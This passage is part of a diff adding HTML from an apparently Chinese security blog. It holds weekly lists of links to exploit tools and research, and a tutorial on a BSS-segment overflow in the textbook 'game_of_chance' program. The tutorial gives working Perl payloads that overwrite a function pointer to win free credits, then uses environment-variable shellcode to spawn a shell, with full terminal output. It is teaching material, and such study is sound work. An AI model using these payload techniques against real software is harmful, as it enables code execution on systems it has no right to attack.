+<li>rubber-docker: 从头开始构建 Docker 的项目，帮助理解 Linux 容器技术<br><a href="https://github.com/Fewbytes/rubber-dockerhttps://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.p" target="_blank" rel="external">https://github.com/Fewbytes/rubber-dockerhttps://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.p</a></li>
+<li>CanSecWest 2018 大部分议题材料已放出<br><a href="https://cansecwest.com/csw18archive.html" target="_blank" rel="external">https://cansecwest.com/csw18archive.html</a></li>
+<li>Invoke-BSOD - 非管理员权限下触发 Windows 蓝屏的 PowerShell 脚本<br><a href="https://github.com/peewpw/Invoke-BSOD" target="_blank" rel="external">https://github.com/peewpw/Invoke-BSOD</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/26/20180326安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/26/20180326安全动态/" itemprop="url">
+                  20180326安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-26T16:34:03+08:00">
+                2018-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>return-to-csu：一种绕过 64 位 Linux ASLR 的新方法，来自 BlackHat Asia 2018<br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></li>
+<li>DSCompromised：利用 Windows DSC 进行横向渗透的利用脚本<br><a href="https://github.com/matthastings/DSCompromised" target="_blank" rel="external">https://github.com/matthastings/DSCompromised</a></li>
+<li>Apache httpd 2.4 漏洞一览<br><a href="https://httpd.apache.org/security/vulnerabilities_24.html" target="_blank" rel="external">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
+<li>iCloudBrutter - AppleID 暴力破解脚本<br><a href="https://github.com/m4ll0k/iCloudBrutter" target="_blank" rel="external">https://github.com/m4ll0k/iCloudBrutter</a></li>
+<li>通过 BLIND OOB XXE 获取文件系统访问权限<br><a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" target="_blank" rel="external">https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/</a></li>
+<li>SSRF 漏洞的新时代 - 针对 URL 解析器的利用，来自 BlackHat Asia 2018<br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/asia-18/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf</a></li>
+<li>JSON Web Token 安全性研究<br><a href="https://www.slideshare.net/snyff/jwt-insecurity" target="_blank" rel="external">https://www.slideshare.net/snyff/jwt-insecurity</a></li>
+<li>MS-RDP 认证漏洞分析与利用（CVE-2018-0886）<br><a href="https://www.preempt.com/wp-content/uploads/White_paper_CredSSP.pdf" target="_blank" rel="external">https://www.preempt.com/wp-content/uploads/White_paper_CredSSP.pdf</a></li>
+<li>Pwn a CTF Platform with Java JRMP Gadget<br><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="external">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li>
+<li>第二届强网杯Web Writeup<br><a href="http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html</a></li>
+<li>深入解析 Linux - 符号解析的艺术<br><a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="external">https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488</a></li>
+<li>ADRecon - 用于收集 Active Directory 信息的工具，并可生成 AD 环境当前状态的整体报告<br><a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="external">https://github.com/sense-of-security/ADRecon</a></li>
+<li>客户端 session 导致的安全问题<br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></li>
+<li>红队渗透测试 5 方面大解密，介绍不同阶段的技术及工具等<br><a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x68;&#116;&#x74;&#112;&#x73;&#58;&#47;&#x2f;&#109;&#x65;&#100;&#x69;&#117;&#109;&#x2e;&#99;&#x6f;&#109;&#x2f;&#64;&#97;&#100;&#97;&#x6d;&#x2e;&#x74;&#x6f;&#x73;&#x63;&#104;&#101;&#114;&#47;&#116;&#x6f;&#112;&#x2d;&#x66;&#105;&#x76;&#x65;&#45;&#119;&#x61;&#x79;&#x73;&#x2d;&#x74;&#104;&#x65;&#x2d;&#x72;&#101;&#100;&#45;&#116;&#x65;&#x61;&#x6d;&#x2d;&#98;&#x72;&#101;&#97;&#x63;&#104;&#x65;&#x64;&#45;&#116;&#x68;&#x65;&#x2d;&#101;&#120;&#116;&#101;&#x72;&#110;&#97;&#x6c;&#x2d;&#x70;&#x65;&#x72;&#105;&#109;&#x65;&#x74;&#x65;&#114;&#45;&#50;&#54;&#x32;&#102;&#x39;&#57;&#100;&#x63;&#57;&#100;&#49;&#55;">&#x68;&#116;&#x74;&#112;&#x73;&#58;&#47;&#x2f;&#109;&#x65;&#100;&#x69;&#117;&#109;&#x2e;&#99;&#x6f;&#109;&#x2f;&#64;&#97;&#100;&#97;&#x6d;&#x2e;&#x74;&#x6f;&#x73;&#x63;&#104;&#101;&#114;&#47;&#116;&#x6f;&#112;&#x2d;&#x66;&#105;&#x76;&#x65;&#45;&#119;&#x61;&#x79;&#x73;&#x2d;&#x74;&#104;&#x65;&#x2d;&#x72;&#101;&#100;&#45;&#116;&#x65;&#x61;&#x6d;&#x2d;&#98;&#x72;&#101;&#97;&#x63;&#104;&#x65;&#x64;&#45;&#116;&#x68;&#x65;&#x2d;&#101;&#120;&#116;&#101;&#x72;&#110;&#97;&#x6c;&#x2d;&#x70;&#x65;&#x72;&#105;&#109;&#x65;&#x74;&#x65;&#114;&#45;&#50;&#54;&#x32;&#102;&#x39;&#57;&#100;&#x63;&#57;&#100;&#49;&#55;</a></li>
+<li>Hacking Tutorials 推荐的几本 hacking 书籍<br><a href="https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/" target="_blank" rel="external">https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/</a></li>
+<li>利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单<br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/22/BSS段的溢出攻击/" itemprop="url">
+                  BSS段的溢出攻击
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-22T01:30:17+08:00">
+                2018-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
+<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
+<li><p>from game_of_chance.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
+</li>
+<li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
+</li>
+<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
+<li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！！！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li>
+<li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
+<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
+<ul>
+<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。</li>
+<li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
+<li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
+<li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+<li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到函数被调用我们增加了100金币</p>
+</li>
+<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
+<ul>
+<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="external">github repo</a></p>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li>《Hacking the art of exploitation》0x342</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/19/20180319安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/19/20180319安全动态/" itemprop="url">
+                  20180319安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-19T13:17:36+08:00">
+                2018-03-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016<br><a href="https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf</a></li>
